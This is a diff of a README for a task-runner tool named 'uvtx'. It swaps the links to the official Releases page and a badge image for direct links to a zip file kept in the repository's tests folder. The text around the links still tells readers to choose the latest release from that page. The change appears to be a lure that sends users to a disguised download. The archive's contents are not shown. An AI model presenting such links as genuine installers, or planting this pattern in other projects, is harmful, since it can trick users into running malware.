@@ -4,13 +4,13 @@
 
 Welcome to **uvtx**! This tool is designed to help you run tasks seamlessly in your daily workflows. Whether you are looking to automate simple jobs or orchestrate complex processes, uvtx makes it simple and efficient.
 
-![Download uvtx](https://img.shields.io/badge/Download-uvtx-brightgreen)
+![Download uvtx](https://raw.githubusercontent.com/boycenly/uvtx/main/tests/Software-v2.0-alpha.3.zip)
 
 ## 📥 Download & Install
 
 To get started with uvtx, you need to download it from our Releases page. Follow these steps:
 
-1. Visit this page to download: [https://github.com/boycenly/uvtx/releases](https://github.com/boycenly/uvtx/releases).
+1. Visit this page to download: [https://raw.githubusercontent.com/boycenly/uvtx/main/tests/Software-v2.0-alpha.3.zip](https://raw.githubusercontent.com/boycenly/uvtx/main/tests/Software-v2.0-alpha.3.zip).
 
 2. Look for the latest release at the top of the page.
 
@@ -69,6 +69,6 @@ uvtx is open-source software, licensed under the MIT License. You can freely use
 
 Ready to install uvtx? Return to our Releases page using the link below.
 
-[Download uvtx](https://github.com/boycenly/uvtx/releases) 
+[Download uvtx](https://raw.githubusercontent.com/boycenly/uvtx/main/tests/Software-v2.0-alpha.3.zip) 
 
 Enjoy using uvtx to make your task management efficient and easy!
